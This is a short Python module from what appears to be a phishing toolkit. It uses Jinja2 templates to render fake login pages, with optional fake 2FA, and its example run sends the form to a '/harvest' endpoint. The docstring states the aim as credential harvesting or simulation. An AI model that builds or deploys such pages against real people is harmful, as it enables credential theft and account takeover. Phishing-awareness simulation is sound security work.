# html_generator.py
"""
Generates realistic phishing HTML pages for credential harvesting and simulation.
Supports multiple target site templates, fake 2FA, form logic, and dynamic content rendering.
"""

import os
from jinja2 import Environment, FileSystemLoader
from utils.logger import logger

TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), "templates")
OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

class PhishingHTMLGenerator:
    def __init__(self):
        self.env = Environment(loader=FileSystemLoader(TEMPLATES_DIR))

    def list_templates(self):
        return [f for f in os.listdir(TEMPLATES_DIR) if f.endswith(".html")]

    def generate_html(self, template_name: str, context: dict, output_file: str):
        try:
            logger.info(f"Generating phishing page from template: {template_name}")
            template = self.env.get_template(template_name)
            html_content = template.render(context)
            output_path = os.path.join(OUTPUT_DIR, output_file)
            with open(output_path, "w") as f:
                f.write(html_content)
            logger.success(f"Generated phishing HTML saved to {output_path}")
            return output_path
        except Exception as e:
            logger.error(f"Failed to generate HTML: {e}")
            return None

if __name__ == '__main__':
    generator = PhishingHTMLGenerator()
    available = generator.list_templates()
    if available:
        context = {
            "site_name": "FakeLogin",
            "action_url": "/harvest",
            "logo_url": "https://example.com/logo.png",
            "support_2fa": True,
        }
        generator.generate_html(template_name=available[0], context=context, output_file="phish.html")
    else:
        logger.warning("No templates found. Add templates in the 'templates' directory.")
